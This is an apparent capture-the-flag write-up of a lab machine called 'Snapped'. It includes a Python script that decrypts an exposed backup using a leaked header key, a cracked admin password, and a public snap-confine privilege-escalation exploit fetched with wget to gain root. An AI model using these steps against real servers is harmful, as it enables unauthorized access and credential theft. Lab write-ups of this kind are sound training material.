# Snapped

## Reconnaissance

I begin by enumerating the target with FFUF and identify the `admin.snapped.com` subdomain. After visiting the site, I inspect the browser’s network tab to look for exposed API endpoints and other relevant functionality.

<img width="1855" height="937" alt="Screenshot From 2026-10-08 16-31-51" src="https://github.com/user-attachments/assets/0354ac1f-de1a-413a-ba98-002cdc73006f" />

After testing the `install` endpoint for a period of time, I become interested in a possible backup route based on the known vulnerable NGINX architecture. I probe for `api/backup` and receive a positive response.

<img width="1056" height="448" alt="Screenshot From 2026-10-08 16-43-58" src="https://github.com/user-attachments/assets/be94c7ea-95ee-46e0-bebf-41cafc0f092c" />

## Initial Access

I download the ZIP archive from the backup endpoint while preserving the `X-Backup-Security` value, which is required to decrypt the contents.

<img width="1346" height="111" alt="Screenshot From 2026-10-08 16-33-45" src="https://github.com/user-attachments/assets/64087274-4785-482d-b20b-4937e6a3cf93" />

To achieve this, I use a simple Python script to extract the security header, decode the key and IV, decrypt the archive, and recover the clean backup file:

```python3
import base64
import requests
import zipfile
import io 
from Crypto.Cipher import AES

url = "http://admin.snapped.htb/api/backup"
print("[*] Requesting backup and active keys...")
response = requests.get(url, stream=True)

# 1. Isolate the custom session security header
security_header = response.headers.get("X-Backup-Security")
if not security_header:
    print("[-] Failed to locate X-Backup-Security header.")
    exit(1)

print(f"[+] Found Header: {security_header}")
key_b64, iv_b64 = security_header.split(":")

# 2. Decode the dynamic strings into binary formats
key = base64.b64decode(key_b64)
iv = base64.b64decode(iv_b64)
try: 
    outer_zip= zipfile.ZipFile(io.BytesIO(response.content))
# 3. Read the clean raw binary body stream
    encrypted_data = outer_zip.read("nginx-ui.zip")
except Exception as e:
    print(f"Failed to read outer zip contents: {e}")
    exit(1)

# 4. Decrypt via AES-CBC mode without standard PKCS7 constraints
print("[*] Decrypting payload stream...")
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted_data = cipher.decrypt(encrypted_data)
decrypted_data = decrypted_data.rstrip(b"\x00")

# 5. Save the valid archive
output_file = "clean_backup.zip"
with open(output_file, "wb") as f:
    f.write(decrypted_data)

print(f"[+] Success! Valid archive written to: {output_file}")
```

The script successfully decrypts the archive, allowing me to extract the contents and locate a valuable `database.db` file.

<img width="1022" height="370" alt="Screenshot From 2026-10-08 17-08-04" src="https://github.com/user-attachments/assets/77a2dff0-8260-435b-9add-9c9104b39f27" />

I then use `sqlite3` to connect to the database and query the `users` table:

<img width="960" height="283" alt="Screenshot From 2026-10-08 17-26-26" src="https://github.com/user-attachments/assets/4edd7a31-e467-4234-9a83-7a28daff042e" />

This yields the administrator hash:

<img width="1920" height="125" alt="Screenshot From 2026-10-08 17-26-53" src="https://github.com/user-attachments/assets/e481811b-aae2-45ff-838c-578ec325e2ae" />

Comparing this hash against `rockyou.txt` with `hashcat` reveals the password: `linkinpark`.

I then authenticate to SSH as the user `jonathan` using the recovered credentials and successfully retrieve the user flag.

<img width="955" height="43" alt="image" src="https://github.com/user-attachments/assets/83f67e6e-4b38-4653-ad57-4dec11560d84" />
<img width="378" height="61" alt="image" src="https://github.com/user-attachments/assets/4de4508a-f8a8-4ede-a1cc-2d1da1e5a643" />

## Privilege Escalation

After obtaining the user flag, I notice that the system is using `snap`. I confirm this by checking the installed version with `snap --version`.

<img width="741" height="188" alt="image" src="https://github.com/user-attachments/assets/82e302da-a0cf-496f-b4ef-b1ed35bba687" />

This version is vulnerable to CVE-2026-3888. Using the C-based exploit scripts provided by [TheCyberGeek](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/tree/main), it is possible to trigger the race condition and escalate privileges to root.

I fetch the exploit source from the linked repository, compile it locally, and prepare it for deployment to the host.

<img width="1120" height="56" alt="image" src="https://github.com/user-attachments/assets/5b92cfb3-bd9b-42b9-98a1-a63ac301e5b9" />

I then create a Python HTTP server to host the compiled binary, fetch it on the target machine using `wget`, execute the exploit, and obtain the root shell.

<img width="480" height="35" alt="image" src="https://github.com/user-attachments/assets/53f69e6e-7d4d-47a6-8297-aacc11e54ffa" />
<img width="1493" height="612" alt="image" src="https://github.com/user-attachments/assets/7fb9b714-b446-44cd-ba64-d0c49685fefb" />
<img width="787" height="492" alt="image" src="https://github.com/user-attachments/assets/3f97a7af-bde1-4013-8974-3b23e70b38bb" />
<img width="1112" height="832" alt="image" src="https://github.com/user-attachments/assets/0e7f374e-3d70-436f-a078-62bd58ad0112" />

## Final Recap

This machine was solved by combining effective reconnaissance, API abuse, credential recovery, and a local privilege escalation.

- Enumerated the target with FFUF and identified the `admin.snapped.com` subdomain.
- Reviewed the application’s network traffic and discovered a likely backup endpoint.
- Accessed the backup endpoint and captured the `X-Backup-Security` header.
- Decrypted the backup archive and extracted the SQLite database.
- Queried the `users` table and recovered the administrator password hash.
- Cracked the password using `rockyou.txt` and gained SSH access as `jonathan`.
- Retrieved the user flag.
- Identified a vulnerable `snap` version and exploited CVE-2026-3888 to escalate to root.
- Successfully obtained the root flag and completed the challenge.
